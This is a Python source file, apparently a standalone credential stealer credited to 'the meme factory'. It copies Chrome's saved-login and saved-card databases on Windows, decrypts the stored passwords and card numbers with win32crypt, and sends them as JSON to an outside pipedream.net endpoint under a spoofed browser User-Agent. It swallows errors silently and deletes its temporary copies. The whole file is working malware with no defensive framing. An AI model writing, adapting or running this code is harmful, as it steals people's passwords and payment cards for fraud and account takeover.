#Made by the meme factory
#Copyright 2019

#Imports
import os
import sys
import win32crypt
import sqlite3
import shutil
import urllib.request
import json

#Classes
class Password:
	def __init__(self,url,username,password):
		self.url = url
		self.username = username
		self.password = password

class CreditCard:
	def __init__(self,name,expiry,number):
		self.name = name
		self.expiry = expiry
		self.number = number

class SQLite3Connection:
	def __init__(self,path):
		try:
			self.connection = sqlite3.connect(path)
			self.cursor = self.connection.cursor()
		except:
			sys.exit()
	def run(self,query):
		if self.cursor:
			self.cursor.execute(query)
			return self.cursor.fetchall()
		else:
			sys.exit()
	def close(self):
		self.connection.close()

class ChromePasswordStealer:
	def __init__(self):
		self.path = os.path.join(os.getenv("USERPROFILE"),"logins.bak")
		self.src = os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
		shutil.copy(self.src,self.path)
		self.connection = SQLite3Connection(self.path)
	def steal(self):
		data = self.connection.run("SELECT action_url, username_value, password_value from logins")
		passwords = []
		if len(data) > 0:
			for pwd in data:
				url = pwd[0]
				username = pwd[1]
				try:
					password = win32crypt.CryptUnprotectData(pwd[2],None,None,None,0)[1].decode()
				except:
					pass
				if password:
					pwdobj = Password(url,username,password)
					passwords.append(pwdobj)
			self.connection.close()
			os.remove(self.path)
			return passwords
		else:
			self.connection.close()
			os.remove(self.path)
			return None

class ChromeCardStealer:
	def __init__(self):
		self.path = os.path.join(os.getenv("USERPROFILE"),"cards.bak")
		self.src = os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data"
		shutil.copy(self.src,self.path)
		self.connection = SQLite3Connection(self.path)
	def steal(self):
		data = self.connection.run("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
		cards = []
		if len(data) > 0:
			for crd in data:
				name = crd[0]
				expiry = "{}/{}".format(crd[1],crd[2])
				try:
					number = win32crypt.CryptUnprotectData(crd[3],None,None,None,0)[1].decode()
				except:
					pass
				if number:
					card = CreditCard(name,expiry,number)
					cards.append(card)
			self.connection.close()
			os.remove(self.path)
			return cards
		else:
			self.connection.close()
			os.remove(self.path)
			return None

#Functions
def main():
	sendval = {}
	try:
		passwordstealer = ChromePasswordStealer()
		cardstealer = ChromeCardStealer()
		passwords = passwordstealer.steal()
		cards = cardstealer.steal()
		if passwords:
			sendval["passwords"] = []
			for password in passwords:
				sendval["passwords"].append({
					"url": password.url,
					"username": password.username,
					"password": password.password
				})
		if cards:
			sendval["cards"] = []
			for card in cards:
				sendval["cards"].append({
					"name": card.name,
					"expiry": card.expiry,
					"number": card.number
				})
	except:
		pass
	req = urllib.request.Request("https://eni9j3uswmflh.x.pipedream.net/")
	jsondata = json.dumps(sendval)
	reqbytes = jsondata.encode("utf-8")
	req.add_header("Content-Type","application/json; charset=utf-8")
	req.add_header("Content-Length",len(reqbytes))
	req.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36")
	urllib.request.urlopen(req,reqbytes)

#Main
if __name__ == "__main__":
	main()